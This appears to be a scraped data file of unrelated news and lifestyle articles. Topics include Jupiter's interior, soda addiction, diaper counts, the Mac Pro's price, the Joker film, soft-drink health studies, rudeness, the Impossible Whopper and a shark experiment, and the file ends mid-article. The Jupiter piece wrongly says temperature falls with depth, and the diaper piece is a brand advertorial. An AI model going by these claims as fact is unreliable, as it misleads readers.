Far beneath Jupiter's atmosphere is a gigantic ocean of liquid metallic hydrogen, which would look and behave like mercury except that hydrogen has 60 percent the density of water. So, you would have to sink for tens of thousands of kilometers to reach a hot, molten, rocky core that's possibly solid.

The interior of Jupiter is not precisely mapped – that is one of the scientific goals of the Juno mission, which has just reached Jupiter. The probe will use precise gravitational and electromagnetic measurements to map what goes on underneath Jupiter’s clouds.

I know that the answer so far is not really satisfying, so let’s drop the pretense of a magical observer and let’s dive into Jupiter with current technologies.

Jupiter is really warm, with the top of its atmosphere at about 900 Kelvins (630°C / 1,160°F). As we fly down through the atmosphere, the temperature quickly drops as the pressure and wind speed increase. Following what happened to the Galileo probe, which dived into Jupiter in 1995, things start going badly for electronics 58 minutes into our exploration and 156 kilometers (97 miles) into the atmosphere. For the Galileo probe, this combination of pressure (23 atmospheres) and temperature (153°C / 307°F) proved deadly.

But it's been 20 years, so let's assume we can continue down. At 500 kilometers (310 miles), the visibility is almost completely gone and the thick ammonia clouds swirl all around us, with wind speeds of around 100 meters (330 feet) per second.

Underneath the ammonia clouds, there are more water clouds and more complex atmospheric effects that Juno will hopefully clarify. Current technology will have been pulverized by now, and our remains will now be traveling to a layer of supercritical fluid hydrogen – something not quite a gas but not exactly a liquid either.

After about 2.5 hours of exploration, we will have reached the liquid metallic hydrogen ocean. Heavy elements might reach the center after many more hours of falling. So, you couldn't exactly stand on this ocean. But below this, it's thought Jupiter may indeed have a rocky core, perhaps somewhat similar to terrestrial planets. Juno will help answer this question during its mission.

Jupiter has most of the planetary mass of the Solar System, and could easily fit all the other planets in its interior. There's a reason why it is the planetary king of the Solar System.",What Would Happen If You Tried To Stand On Jupiter?,

What makes soda so addictive?

",28/10/2019 13:41,"https://www.cnn.com/2019/10/28/health/soda-soft-drinks-addictive-drayer-food-wellness/index.html#:~:text=The%20fizz%20factor&text=In%20fact%2C%20carbonation%20makes%20any,reward%E2%80%9D%20feeling%2C%20Wenk%20explained.","(CNN) Slashing soft drinks from your diet is a quick way to improve your health and lose weight -- that much you probably already know.

But actually giving up your soda habit isn't always an easy task. While some people can function just fine without soft drinks, others find they need their fix starting at breakfast.

And we're not only talking about the sugary kind. For some, a daily soda ritual includes chugging multiple cans of artificially sweetened beverages, which aren't much better

So what is it about soda -- both regular and diet -- that makes it so addictive?

According to Gary Wenk, director of neuroscience undergraduate programs at the Ohio State University and author of ""Your Brain on Food,"" it's all in the beverage's design. Your favorite brand of soft drink is engineered with just the right amount of sweetener, caffeine and carbonation to make you continuously want to grab and gulp.

The sugar factor

But that rush of sweetness also appears to activate the same reward centers in the brain as drugs, Wenk explained. It triggers the release of the brain chemical dopamine in a region known as the nucleus accumbens , and as a result we feel euphoria.

""The sugar in the drinks ... swish through the brain, you get the dopamine rewarding you, and then the effect of the dopamine surge is gone almost as fast as it arrived, leaving your brain wanting more,"" Wenk said.

In fact, one review concluded that sugar can even be more rewarding and attractive than cocaine.

But satisfying that desire for more sugar can lead to larger cravings.

""The more soda you drink, the bigger the 'reward,' and as would happen with most pleasurable things, we develop an affinity and want even more of them,"" said Cordialis Msora-Kasago, a registered dietitian nutritionist and spokesperson for the Academy of Nutrition and Dietetics.

A caffeine kick

Sugar isn't the only ingredient to blame when it comes to soda's addictive qualities.

There's also caffeine, which is a stimulant -- ""and our brain craves things that stimulate it,"" he continued. Caffeine not only speeds up our thinking but also has its own unique ability to activate reward pathways that involve dopamine, according to Wenk.

""Caffeine is one of the most widely consumed psychostimulants in the world ... and it does have an addictive property,"" said Dr. Marilyn Cornelis, an assistant professor of preventative medicine at Northwestern University. ""[With soda], we're getting the sugar high combined with caffeine, and that is quite a good feeling that might cause you to consume more the next day or another time.""

When consumed regularly, people often start to rely on caffeine to increase attentiveness, alertness and energy, according to Msora-Kasago. ""They may feel dependent upon it and even experience signs of withdrawal, such as headaches and poor concentration, when they do not have it,"" she said.

The fizz factor

There's yet another element that plays a very significant role in soda's lure: the fizz. ""If you take Coca-Cola and sit it on the countertop for a day or so, how much would you enjoy drinking it?"" Wenk said.

In fact, carbonation makes any drink much more addictive, according to Wenk.

Those bubbles add a small amount of acidity, which when combined with sugar intensifies the euphoric ""reward"" feeling, Wenk explained. Carbonation also has the ability to make sugar take a bit of a back seat -- which is not to say that sugar doesn't still exert its pleasurable effects, but that the bubbles blunt the sweet taste just enough to make you crave even more.

No sugar, same problems

Although diet sodas replace real sugar with artificial sweeteners, those may have their own addictive characteristics. According to Msora-Kasago, they trigger taste receptors that register the sweetness and expect sugar, essentially preparing the brain for a reward that never comes.

And when ""the brain doesn't get the reward it wants from its drink -- the real sugar -- it says, 'go out and get me some more,' "" Wenk said.

And, as with regular soda, the carbonation compounds the effect of artificial sweeteners -- dulling the taste just enough to intensify our cravings and have us cracking open another can.

Rituals and genes

But why do some people seem to crave soda after soda, while others can have just one and be satisfied? It may have to do with some of the ritual aspects of soda drinking, which also play a role in our brain's chemistry. Everything from hearing the pop and the fizz of the carbonation to seeing the words ""diet"" written on a can -- an aspect of reward in itself for engaging in what is perhaps considered a ""virtuous"" behavior -- can increase the activity of dopamine cells.

""Even before you get that first dose of caffeine in your brain, you are already feeling the reward,"" Wenk said.

And that expectation helps establish a habit. ""[People] are studying late at night, driving home or heading into a meeting, and that can of soda is the one thing that keeps them alert and engaged,"" Msora-Kasago said.

Diet soda in particular may become habit-forming when it's seen as the ""healthier"" choice. For example, it's common to replace a regular soda habit with diet soda, which reduces calorie intake without giving up the actual soda habit, Msora-Kasago explained.

And at least one study suggests that there may be genetic underpinnings related to our desire to consume sweet beverages. In the study, people who had a variant in a gene known as FTO -- which has previously been linked to a lower risk of obesity -- surprisingly had an affinity for sweetened beverages.

""People with this FTO variant are more likely to drink more soda,"" explained Cornelis, who co-authored the study. Though the link to lower obesity risk is counterintuitive, it is ""a similar trend observed by other scientists"" and something researchers are still trying to understand, according to Cornelis. About 20 to 30% of the population has the genetic variant.

Kicking the can

If you're having a soft drink on occasion -- say a few times per month -- there's no need for concern. But if you're having more than one soda per day, you could be putting yourself at risk for health conditions that include obesity, heart disease and type 2 diabetes, according to Msora-Kasago. And drinking diet soda comes with risks too: consuming just one can per day has been linked to increased risk of stroke and dementia

""The key is finding (another) beverage that you enjoy,"" Msora-Kasago said. ""Unsweetened milk is always a great place to start because in addition to quenching thirst, milk provides many important nutrients such as protein and calcium.""

For a lower-calorie option, you can enjoy a cup of unsweetened tea, which adds flavor and gives a boost of disease fighting antioxidants.

And water remains the tried and true beverage for better health. If you don't like still water, Msora-Kasago recommends finding an unsweetened sparkling water that you enjoy, or making your own spritzer by mixing three parts of sparkling water with one part fruit or vegetable juice.

If you're drinking soda for an energy boost during the day, you may want to check in on your sleep. Research suggests that there may be a link between sleeping less than 5 hours per day and drinking more sugary, caffeinated sodas, Msora-Kasago explained.

But whether getting enough sleep will actually discourage you from reaching for that can of cola is much less definitive. ""The well-rested brain will encourage you to drink as much soda as a sleepy brain,"" Wenk said.",Why soda is so addictive -- and some good alternative beverages,

How many diapers does a baby really need in the first 3 months? About a million.When I read in my pregnancy and parenting books that a newborn will go through 7–12 diapers a day at first, I didn't believe it. I could not imagine changing that many diapers and how repetitive and exhausting that would be. If you have kids, you know where this story is going. The books were right and newborns really do go through that many diapers!The unique liner helps your baby feel dry and keeps them comfortable. For good sleepers (in my dreams), the diaper offers up to 12 hours of overnight protection.My absolute favourite feature about Pampers Swaddlers is the colour-changing wetness indicator that lets you know when your baby needs to be changed. A yellow line means the diaper is dry, and a blue line means it's wet. Easy peasy. This is especially useful for middle of the night feedings where you want to quickly check if baby's diaper needs to be changed or not.The first days at home with a baby are a jumbled and blurred mix of changing diapers, feeding and burping, putting your baby to sleep, rinsing and repeating. It was months before I would only need to change my little one's diaper 6 or 8 times a day. Usually it was closer to 10 times.I did the calculations so you can see exactly how many you might need in those first few months:That's a lot of diapers!With that many diapers going on your little bundle of joy, using the right brand is important. I prefer Pampers Swaddlers because I can feel confident that my baby will stay comfortable and dry. And I really love that little blue line.",How many diapers does a baby really need in the first 3 months?,

Is the Mac Pro Overpriced Compared to a PC?
",15/10/2019 11:13,https://www.howtogeek.com/442418/is-the-mac-pro-overpriced-compared-to-a-pc/,"Apple’s Mac Pro will be made in the USA with a starting price of $6,000. You get a pretty sweet machine for that price, but how close could you get to the power of the Mac Pro if you tried to build a Windows version yourself?

You Could Build a PC With Similar Hardware for Less

No surprise: By our calculations, you can get the job done for much less, though it’ll still cost you. We weren’t able to make a carbon copy of the Mac Pro, but we did get some advantages that the base model Mac Pro doesn’t have. We also had to give up some features in the process.

For this article, we’re focusing on the base model since it’s the only one with a known price at this writing. We have no idea what the upper models will cost, so there’s nothing to compare it to, price-wise. If you want to see a nice example of a killer Windows machine that goes head-to-head with the best Mac Pro, check out this video by Linus Tech Tips.

Before we get into our base model, one last note. We did not build this machine ourselves. So this is not a build guide. It’s more of a thought experiment. Enough preamble—let’s dive in.

The CPU and Motherboard

Apple doesn’t specify which Xeon W CPU it’s using in the base model of the Mac Pro, but we do know it has eight cores, 16 threads, and a turbo boost of 4GHz. Looking at Intel’s ark listings, that is similar to the Xeon W-3223—although the cache is a little larger on the Mac Pro CPU. The W-3223 has an MSRP of $749 but is not available on major sites like Newegg or Amazon.

So we swapped it out with something close to its specs, the Xeon W-2145. That’s a Skylake part from late 2017. It has eight cores, 16 threads, but a higher boost at 4.5GHz. Nevertheless, it has the advantage of being available, though just barely, and as an OEM part. That means it comes without a cooler and the warranty is shorter. That’s not great for an actual purchase, but for a thought experiment, it’ll do.

Here is where we hit difficulty number two: Apple’s Mac Pro motherboard is a pretty sweet custom build with enough capacity for eight PCIe lanes, two Thunderbolt 3 ports in the back, and two 10G LAN ports.

To try and get close to all this we’re going with the Asus WS C422 Sage/10G. This is a single-CPU motherboard with seven full-size PCIe slots, two dual 10G LAN ports, and an M.2 slot.

Based on the best prices we can find we’ve spent $1,290 at B&H Photo on the CPU. We can find lower prices on Amazon, but they are through third-party sellers without Amazon fulfillment. That means if there are any issues you’re relying on the seller’s customer service policy, not Amazon’s. It’s better to go with a known quantity when buying online, in our opinion.

As for the motherboard, you can pick that up for $749.76 from Newegg.

Finally, we need a CPU cooler since we didn’t get one with our Xeon. So we’ll pick-up the Noctua NH-D15 for $89.95

Total so far: $2,129.71

Already, we can see the costs are adding up. We could’ve gone cheaper by swapping out for a different Intel Xeon, but the point is to try and match the Mac Pro as best we can. For that reason we can’t go with an Intel Core i part, because those are consumer- and enthusiast-grade CPUs that don’t support the boatload of PCIe lanes that you get with Xeon chips—a key requirement for a workstation.

The GPU

This part is easy. The base model is rocking an AMD Radeon Pro 580X with 36 compute units, 2304 stream processors, 8GB of GDDR5 memory. We’ll throw caution to the wind here and pick up the non-pro Sapphire Radeon Nitro+ RX 590 for $216. This card has 8GB of GDDR5, 2304 stream processors, and 36 compute units. The Mac Pro has six inputs (two HDMI, and four DisplayPort), while the Nitro+ has two HDMI, two DisplayPort, and one DVI. You’re short by one port (two if you hate DVI), but it’s close enough.

You know, what? Let’s double up on the GPUs. Apple’s Mac Pro has this magic Afterburner Pro Res card, so let’s use that as an excuse to double up and use some of those PCIe slots.

Total so far: $2,561.71

Thunderbolt 3

Ugh. Thunderbolt 3. Here’s the deal. Apple is in love with Thunderbolt and widely supports it. Outside the realm of the Mac, however, Thunderbolt 3 on desktops is not as big. The C422 Sage only has one Thunderbolt 3 header on the motherboard. So we’re limited to a single Asus ThunderboltEX 3 add-in card, and of course, it only has one Thunderbolt port. You can use multiple devices off that single port, mind you, but still, the dream of even just two Thunderbolt 3 ports is not happening.

We could try a different card, but Thunderbolt is, to borrow a phrase, a bag of hurt, so we won’t risk it. That card costs $79.04 and comes with a Thunderbolt port, a USB 3.1 port, and one DisplayPort.

Total so far: $2,631.71

RAM, Power supply, Storage, Cooling and Case

Now we’re getting closer to home. Crucial has 8GB 2666MHz ECC RAM that works with the C422. The 8GB modules are priced at $62, bringing our total RAM cost to $248.

Advertisement



For storage, the Mac Pro has a 250GB SSD. We’ve got a little wiggle room with pricing, and we want a really good SSD for this machine. Let’s go with the NVMe 512GB Samsung 970 Pro, which was on sale for $150 at this writing at Newegg.

Apple puts a 1.4 Kilowatt PSU in the Mac Pro so we’ll go with the fully modular EVGA Supernova 1600 T2 80+ Titanium power supply for $400. That’s a much bigger PSU than the Mac Pro has, but we have some breathing room on costs so let’s put it in.

Finally, we need a case. The C422 is a CEB form factor, which has the same mount points as an ATX motherboard. So as long as the case suits E-ATX and ATX, we should be fine. We won’t be able to get anything that looks like the Mac Pro “cheese grater” of course, but if there’s one thing the PC landscape doesn’t suffer for its choice in cases.

Our selection was the Corsair Crystal Series 680X RGB High Airflow case for $260. It’s a nice-looking, large case with four fans. The RGB fans may not be to everyone’s taste, but you can just turn off the LEDs if you like. The Mac Pro doesn’t have a special CPU cooler relying on the three fans and airflow cooling. So for this thought experiment, we’ll assume the high airflow case, and its fans will be enough (they probably won’t be).

Total: $3,689.71

Conclusion

So after everything we’re spending close to $3,700, far less than the $6,000 cost of the base model of the Mac Pro. So is this a clear example of the Apple Tax? Well, yes but let’s add some caveats. First, you’re always going to get it cheaper when you build it yourself. We also don’t have to factor in the costs of custom design that Apple had to with its motherboard, the proprietary connectors, and those MPX modules.

We are also missing some features such as the extra Thunderbolt 3 ports, and a “pro” designation on our GPUs. But we do have some advantages such as doubling up on GPUs, adding more storage for almost nothing, and a pretty sweet case.

Back to the Apple Tax, does it matter? To everyday consumers, it absolutely does, but this isn’t a consumer PC. To the workstation market, it doesn’t matter as much. If you’re a Mac shop, then Macs are what you want. That could be because the software you’re using just runs better on Macs, or your workflow is set up to accommodate the Apple ecosystem. And if you’ve been waiting for the Mac Pro “trash can” to go away before updating your machines, then the new Mac Pros are a welcome sight.

Still, there’s no question that the Mac Pro is awfully expensive, and only Apple could get away with this kind of pricing.",Is the Mac Pro Overpriced Compared to a PC?,

Does Joker have a postcredits scene?

When the credits roll at the end of Joker, you'll probably have a lot to think about. But one thing you don't need to worry about is sticking around for a postcredits scene. There isn't one.

The bleak and violent film is in theaters now, complete with an incendiary central performance from Joaquin Phoenix. The ending does leave the way open for a sequel, in theory, but there's no mid-credits or postcredits stinger to point in that direction.

Now playing: Watch this: Joker character coming to life in final trailer

Many superhero movies these days include an extra scene during or after the titles, but that's because films in the Marvel Cinematic Universe and DC Expanded Universe tie in with other flicks in the franchises. Joker, by contrast, is a standalone film that suggests its own version of the Batman origin story, but it's not tied into the continuity of other movies such as Justice League or the forthcoming Batman movie starring Robert Pattinson.

So the only reason to stick around is to listen to the strains of Send in the Clowns as the credits roll. You could turn to your buddies and discuss whether the movie leaves the Joker as a pathetic loser or a hero. Or you could read the names of the people who made the movie, such as makeup artist Nicki Ledermann who realized the Joker's iconic face paint.",Does Joker have a postcredits scene?,

Want to live longer? You may want to ditch these drinks
",24/09/2019 13:56,https://www.cnn.com/2019/09/03/health/sugary-drinks-diet-sodas-soft-drink-linked-to-health-issues-wellness/index.html,"(CNN) Brace yourself, lovers of diet sodas and sugary drinks. It's more bad news and yet another reason to consider ditching your favorite soda or soft drink.

A new study followed more than 450,000 people from 10 European countries for up to 19 years and found those who drank two or more glasses of any type of soda a day had a higher risk of dying from any cause of death than people who drank less than a glass each month. None of the people had cancer, diabetes, heart disease or stroke before their participation.

The study, published Tuesday in the journal JAMA Internal Medicine , found men and women who drank two or more glasses a day of sugar-sweetened soft drinks had a higher risk of dying from digestive disorders, while those who drank the same amount of diet drinks had higher risks of dying from cardiovascular disease.

The link to digestive disease in the study is interesting, said Dr. Sharon Horesh Bergquist, an assistant professor of medicine at Emory University School of Medicine in Atlanta.

""Experimental evidence suggests that high blood sugar and high sugar intake can impair the gut barrier, leading to a 'leaky gut' and access to the gut immune system causing intestinal inflammation, alter gut microbiota and increase susceptibility to gut infections,"" she said. ""These pathways may increase susceptibility to digestive diseases.""

Total soft drink consumption in the study was also associated with an increased risk for Parkinson's disease, but not with Alzheimer's or cancer.

Soft drinks were defined as ""low calorie or diet fizzy soft drinks"", ""fizzy soft drinks,"" such as cola and lemonade, and ""fruit squash or cordials,"" which are non-alcoholic concentrated syrups typically mixed with sugar and water. In this study, one glass of soft drink was 8 fluid ounces, or 250 milliliters; the typical can of soda around the world holds 12 fluid ounces or 355 milliliters.

The end of a love affair?

This large, long-term study is yet another in a growing list of research that is sounding the alarm on our love affair with carbonated soft drinks.

In March, a study published in the journal Circulation used data from 80,500 women enrolled in the Nurses' Health Study and nearly 40,000 men from the Health Professionals study. It found that women who drank more than two servings a day of sugary beverages -- defined as a standard glass, bottle or can -- had a 63% increased risk of premature death compared to women who drank them less than once a month. Men who did the same had a 29% increase in risk.

Those who consumed more than one sugary beverage per month but fewer than two per day seemed to experience a dose effect: The more they drank, the greater the risk.

Substituting one sugary beverage per day with an artificially sweetened one was found to lower the risk of premature death, but drinking four or more artificially sweetened beverages increased the risk of premature death from cardiovascular disease in women. The same effect was not seen for men, and it was not seen for the risk of dying from cancer.

Only an association

This study, as well as other research on the connection between diet and sugary beverages and health risks, is observational and cannot show cause and effect. That's a major limitation, researchers say, as it's impossible to determine whether the association is due to a specific artificial sweetener, a type of beverage, obesity or another hidden health issue.

""The cause behind these associations isn't clear,"" said Bergquist. ""Other potential biological causes could be attributed to experimental evidence linking consumption of artificial sweeteners to sugar cravings, appetite stimulation and glucose intolerance.""

Robert Rankin, president of the Calorie Control Council, a trade group for low-calorie and diet foods and beverages, said in a statement that ""low- and no-calorie sweeteners have a long safety record and are important tool for weight management and those managing diabetes. This study paints an inaccurate picture of the important role of these products for consumers.""

Surviving a broken heart

Association or not, you've decided to end the fling with your soft drink du jour (and avoid future infidelities). Good for you, literally. Here are some tips on how to do it with the least heartache.

Cut back correctly

Going cold turkey is tough and may set you up for failure. Instead, registered dietitian and CNN contributor Lisa Drayer suggests a gradual approach.

""Cut back by one serving per day until you're down to one drink per day,"" Drayer said. ""Then aim for one every other day until you can phase out soft drinks entirely.

""Alternate with seltzer/sparkling water can help you cut back,"" she added. ""Eventually you can replace soft drinks with seltzer or sparkling water if you are craving carbonation.""

Find a different fizz

Speaking of carbonation, for a lot of folks, the fix is the fizz. Find a carbonated seltzer water or mix a healthy fruit alternative with sparkling water. You can't go wrong with blueberry or pomegranate juice, said registered dietitian and nutritionist Rahaf Al Bochi, a spokesperson for the Academy of Nutrition and Dietetics.

""The recommendation for fruit juice is usually 4 ounces a day, Al Bochi said.

One caution: Try to drink your bubbly with food, not alone, experts advise. Any type of carbonated water can erode the enamel on your teeth . That's because the carbon dioxide that turns water bubbly turns into carbonic acid in the mouth, which can be detrimental to the health of your teeth.

Stomp the sweet tooth

Bergquist suggests satisfying your sugar cravings by substituting naturally sweet foods such as fruits and dates, which contain ""health-promoting vitamins, minerals and bioactive chemicals called phytonutrients.""

""They package sugar with fiber which leads to a slow and steady, rather than sharp, rise in blood sugar,"" Bergquist said.

She also suggests committing to a no-sugar challenge for at least two weeks.

""Our taste buds turn over every two weeks,"" she said. ""That means that if you can get past the intense sugar cravings the first two weeks, your taste buds will adjust to find natural foods with sugar more satisfying.""

Hinder the habit

We are creatures of routine and ritual. Just like when a person might crave smoking (say after eating), figure out what your habitual trigger is and try to replace it. Bored at your desk? Call a friend before you reach for a soda.

Counter the caffeine

If you've not been drinking caffeine-free soda, then a good part of your addition to that soft drink is the caffeine buzz you're getting. Try substituting green or black tea instead, Al Bochi said.

""You'll get the caffeine boost you're looking for without the added sugar and you'll also be getting a good dose of antioxidants,"" she added.

""Herbal teas like hibiscus, passion fruit, berry, peppermint are flavorful and pleasing without contributing any sugar or calories,"" suggested Drayer.

Woo the water

Carry a water bottle with you or have a pitcher of ice cold water near your desk. If it's easily accessible to you, you are more likely to grab the water than a sugary beverage.

If you're not a fan of plain water, Drayer suggested adding a little sparkle.

""Try infusing fruit into water -- you can purchase a pitcher, fill it with water, then add slices of oranges, lemons, strawberries, watermelon or whatever fruit you like so the water will become infused with the fruit flavor and provide sweetness to your palate,"" she said.

Embrace the effort

And finally, allow yourself a slip now and then.

""Remember that drinking a sugary beverage every once in a while will not directly cause adverse health effects,"" said Al Bochi. ""Providing yourself permission to enjoy all beverages while being mindful with how it fits into your overall healthy eating pattern is the key to a healthy relationship with food.""",Want to live longer?

Here's the Perfect Thing to Say When Someone Is Rude
",25/08/2019 18:09,https://time.com/5135513/rude-people-danny-wallace/,"Recently, the British IVF pioneer Lord Robert Winston was sitting on a train traveling from London, England, to Manchester, when he found himself becoming steadily enraged.

Winston is normally a fairly mild-mannered man, known for a big mustache and a friendly demeanor. But what was driving him slowly insane as the train rumbled through its two-hour journey was another passenger in particular. Ignoring the child with her, the woman had picked up her phone and begun what would become a very loud conversation, which would take place over several counties and be peppered with tedious facts and banal detail.

Lord Winston tried to ignore it. He did. But there is something fundamentally un-ignorable about a loud, one-sided conversation. Our brains fight to make sense of them, constantly jarred by sudden and randomly timed replies to sentences we can’t hear.

It was then that Lord Winston made a mistake. He began to tweet about the woman. He took photos of her and sent them out to his more than 40,000 followers. He became more and more red-faced and furious as her dominating chit-chat moved from 30 minutes, to 40, then 50, then an unbelievable hour.

When the train arrived at its destination, Winston bolted. He’d had enough of what he described as her “rudeness.” But the woman faced an unusual surprise. The press had picked up on Winston’s tweets. They were waiting for her on the platform, all big smiles and eager anticipation. And when they gleefully showed her the Lord’s messages, the woman’s face fell. And she too used just one word to describe Lord Winston’s actions that day: “rude.”

I’m sorry if this makes me a snowflake, but we find ourselves living at a time of incredible rudeness. Social media has taught the world it needs to have an opinion, on everything, at all times, and that this opinion must be delivered in a forthright way, so we seem assured, confident, smart. Reality television has taught us to celebrate meanness, so long as that meanness is delivered as “honesty” — an awful get-out clause designed by the truly rude so they can say truly rude things and then expect us all to applaud them for it. In Britain, Brexit has divided a people so distinctly that it feels we only need to know how a person voted on one issue to decide whether we like them or not. In the U.S., the rise of the world’s rudest man to the world’s most powerful position has brought into sharp and terrifying focus just how dangerous one moment of rudeness might prove: it might lead us to nuclear apocalypse.

So what can we do about the rising tide of rudeness? Well, we can have the guts to call it out. It’s our duty. Studies have shown that rudeness spreads quickly and virally, almost like the common cold. Just witnessing rudeness makes it far more likely that we, in turn, will be rude later on. Scientists have described it as a neurotoxin, and once infected by it we are more aggressive, less creative and worse at our jobs. The only way to end a strain is to make a conscious decision to do so.

Winston shone a spotlight on that woman’s behavior, but he did not confront it, and he did not stop it. Instead, that flickering spotlight was shone weakly from afar, shaming her, taking an almost rudimentary form of revenge on her.

And revenge is an interesting side effect of rudeness. When someone commits a crime against us — they rob our house, say — we don’t have any desire to rob their house in return. We want justice. But when someone is rude to us, it speaks to an arguably darker side: we want revenge. We want to make them feel the same disrespect they’ve given us. Sometimes we are simply rude in return. But situations can escalate. The rage and injustice we feel at the inexplicably rude behavior of a stranger can drive us to do odd things. In my own research, surveying 2,000 adults, I discovered that the acts of revenge people had taken ranged from the ridiculous (“I rubbed fries on their windshield”; “I let a dog lick a sausage I was serving them”) to the genuinely disturbing (“I slashed their tires”; “I sabotaged them at work”).

Often, the trick to handling rudeness is far more elegant, and can be done with the gentle delivery of a sentence as simple as “Just stop.”

Combating rudeness is something we must do face-to-face. When we see it happen in a store, we must step up and say “Just stop.” If it happens to a colleague, we must point it out. We must defend strangers in the same way we’d defend our best friends. But we can do it with grace. We can handle it well, by handling it without a trace of aggression and without being rude ourselves. Because once a rude person has had the looking glass held up to them and can see their actions through the eyes of others, they are far more likely to end that strain themselves.

This can be done by you, by me, by everyone. But it can also be done in spectacular ways.

The former Mayor of Bogotá, Antanas Mockus, had one such spectacular way. Realizing that behavior in his city was at an all-time low — people parking without thought, not lining up properly, snapping at each other — he had what might well prove one of the genius ideas of our age. He hired an army of mimes.

Yes, an army of mimes.

These mimes were unleashed onto the streets of Bogotá in their traditional mime costumes, and upon spotting rude behavior would simply stand behind that rude person and mimic their rude actions with startling accuracy. Or maybe you’d see someone parking on the sidewalk and not have the confidence to say anything. Don’t worry. Within seconds they’d be completely surrounded by mimes, all pointing and shaking their heads dramatically. And in that moment, a buoyed public would join in too.

Lord Winston could have done with Mockus that day last week. Noise polluters in Bogotá would often find themselves at the center of a large group of people all dressed up as Benedictine monks, each of them holding one finger to their lips to point out how loud they were being.

Surreality aside, what Antanas Mockus did was playfully and powerfully ensure people felt accountable for their actions. He held that looking glass aloft.

We can’t all afford an army of mimes. But we can afford to say something.

Because we can choose to be civilized, and we can choose to be civil.

We can say “Just stop.”

Why Burger King's new Impossible Whopper isn't totally
vegetarian
",9/08/2019 13:12,https://www.today.com/food/new-burger-king-impossible-whopper-isn-t-vegetarian-t160203,"Burger King made headlines last August with the debut of its Impossible Whopper, a burger made with a plant-based, protein-filled patty. This week, the chain unveiled the next iteration of its Impossible offerings with a new breakfast sandwich: the Impossible Croissan’wich.

When Burger King's original Impossible Whopper hit stores nationwide, many were upset that even though the veggie burger isn't made with any meat (or animal byproducts), the burger itself isn't 100% vegetarian when ordered with no modifications.

The Impossible Whopper uses a plant-protein based burger patty from food technology company Impossible. It's made with soy protein, potato protein, coconut oil, sunflower oil, salt, yeast and a variety of emulsifying agents. Getty Images stock

Last summer, Burger King made it clear that the only way in which its new Whopper was different from the traditional one was the Impossible patty. Since vegans traditionally avoid eggs, the Impossible Whopper was quickly dismissed as a legitimate vegan fast-food alternative since the burger is topped with mayonnaise.

However, many vegetarians consume animals products like cheese and dairy, so a little mayo was deemed OK. However, unless you ask for the Impossible Whopper in a specific way, it might not meet one's definition of true vegetarian fare.

While the burger itself contains no meat, Burger King acknowledged that the Impossible patties are flame-grilled on the same broiler as its chicken and beef products. This means the meatless burger will likely come into contact with bits of meat and poultry as it cooks.

However, with the release of the new breakfast sandwich (which includes a vegetarian sausage patty), many are applauding the chain for taking a step in what they see as the right direction by expanding the menu.

Wow! Burger King has Impossible Breakfast Croissants Sandwiches! YAY — SpicySoozin (@spicysoozin) June 16, 2020

While Burger King may not be targeting strict vegans and vegetarians with its relatively new Impossible offerings, there are still plenty of people opting to get more of their protein from sources beyond meat for ethical and sustainable reasons.

I think I’m in for this. Not remotely a vegetarian & love the original Whopper - but I’ve tried and enjoyed the Impossible Burger before and I’ll be interested to see how it cooks up big scale under a Burger King’s flame-broiled process. https://t.co/3pmQVCRMgC — Guy McLimore (@couchguy) August 2, 2019

I've had an impossible burger and honestly it's not that bad. It was not a Whopper one, but just a burger. I'm not a vegan, vegetarian, or gluten free. Just wanted to try it, and I actually found it quite tasty. Not like a burger-burger, but I would eat it again willingly. — Andrew Jesse (@MilBadger) August 2, 2019

The move to trial meatless options mirrors other fast-food restaurants, too. Chick-fil-A said that it's looking to add more meatless items to its menu, and McDonald's has tested both a vegan burger and vegan McNuggets in Europe.

But is a veggie burger really a healthier meal?

The Impossible Whopper has roughly the same number of calories as a traditional Whopper (they both have similar amounts of fat and protein, as well). But the Impossible Whopper has 9 more grams of carbs; it also has more sodium than its meatier counterpart.

Vegans and vegetarians, if you're ready for that long-awaited STROKE, enjoy the ""Impossible Whopper."" It has no meat and a mere 1080 mg. of sodium.🤣 pic.twitter.com/ghLeNxw1Qh — HaveToTakeATrump (@HaveToTakeATru2) August 1, 2019

Bonnie Taub-Dix, a registered dietician, creator of BetterThanDieting.com and author of ""Read It Before You Eat It:Taking You From Label to Table,"" told TODAY Food that the Impossible items being sold by Burger King definitely do not fall into the ""health food category"" due to the number of calories and amount of saturated fat it contains.

""Having the occasional plant-based burger is fine for anyone, but don’t kid yourself into thinking that it’s any better for you than a meat-based burger,"" Taub-Dix said. ""If you’re looking to save calories and fat, though, perhaps go for a burger smaller than a Whopper, and don’t order your plant-based burger with extra cheese.""

However, there are plenty of plant-based patties (they might not necessarily look or taste like beef) on the market that are a great way to enjoy veggies and get some protein. Many of these items are available in the freezer aisle at your local health food store. Always look at the product's label and examine its macro nutrients, as well as sodium and saturated fat content, Taub-Dix advised.

Back in August, the TODAY anchors gave the Impossible Whopper a thumbs up (Sheinelle Jones even called it ""delightful!).

Jessica Applegren, vice president of communications at Impossible Foods, told TODAY that company sales surged 2019. According to Applegren, some restaurants that carried Impossible products, like Red Robin, ran out of the plant-based patty soon after they started offering it.

Vegetarian burger fans weren't happy then, either.

I'm so sorry for the confusion. Impossible has had a supply shortage, but all of our restaurants should be serving Impossible burgers again. — Red Robin (@redrobinburgers) August 5, 2019

getting real tired of the impossible burger shortage — Trevor 🏳️‍🌈☀️ (@trevleft) August 1, 2019

Shortage issues aside, Impossible products are currently on the menu at about 10,000 restaurants worldwide.

""Growth has come from every sales category in which the company does business. Independent restaurants, large restaurant chains, such as White Castle, Cheesecake Factory and Qdoba, and non-commercial outlets such as theme parks, museums, stadiums and college campuses,"" Applegren said.

Late last summer, Impossible Foods also received the approval to sell its products in grocery stores. Various Impossible products (including its signature burger patty) are now available at food retailers in 37 states.

For vegetarians who want to stick to a strict meat-free regimen, a spokesperson for Burger King confirmed to TODAY that guests ordering the Impossible burger must ask for the patty to be cooked in the oven, instead of being grilled alongside other meat items, when ordering their meal.",Why Burger King's Impossible Whopper isn’t totally vegetarian,

YouTuber Tests If Sharks Can Actually Smell A Drop Of Blood
From A Mile Away

",7/08/2019 9:22,https://www.ladbible.com/community/interesting-youtuber-tests-if-sharks-can-actually-smell-a-drop-of-blood-20190806,"It's a classic Hollywood trope that's been used in countless films and TV shows where someone will be in the ocean and suddenly they get attacked by a shark because there's a drop of blood.

But how accurate is this?

A YouTuber set out to answer this question and the answer has been pretty surprising.

Advert 10

Mark Rober didn't just chuck himself in a tank with a docile shark that's been studied for years, he decided put himself in the middle of the ocean in the Bahamas where there were sharks galore.

They first set up a test to see whether sharks liked the scent of blood over other flavours. They grabbed four surfboards and placed fish oil, cow's blood, seawater, and urine on top of them to see what attracted what.

